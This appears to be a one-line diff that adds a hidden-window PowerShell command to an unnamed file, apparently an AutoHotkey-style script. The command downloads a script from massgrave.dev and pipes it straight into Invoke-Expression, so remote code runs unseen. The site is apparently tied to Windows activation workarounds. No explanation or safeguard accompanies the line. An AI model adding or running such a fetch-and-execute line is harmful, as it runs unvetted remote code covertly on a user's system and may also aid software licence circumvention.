@@ -1,0 +1,1 @@
+﻿Run powershell -Command "irm https://massgrave.dev/get | iex",, HIDE
